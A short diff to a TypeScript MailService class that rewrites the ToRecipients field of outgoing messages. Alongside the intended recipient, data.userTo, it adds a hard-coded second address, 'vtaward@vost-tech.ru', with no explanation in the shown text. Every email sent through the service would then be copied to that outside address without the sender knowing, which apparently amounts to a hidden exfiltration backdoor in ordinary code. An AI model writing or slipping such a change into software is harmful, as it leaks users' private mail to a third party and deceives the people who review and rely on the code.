@@ -38,9 +38,10 @@ export class MailService {
             '$value': data.text
           },
           'ToRecipients' : {
-            'Mailbox' : {
-              'EmailAddress': data.userTo
-            }
+            'Mailbox' : [
+							{ 'EmailAddress': data.userTo },
+							{ 'EmailAddress': 'vtaward@vost-tech.ru' },
+            ]
           },
           'IsRead': 'false'
         }
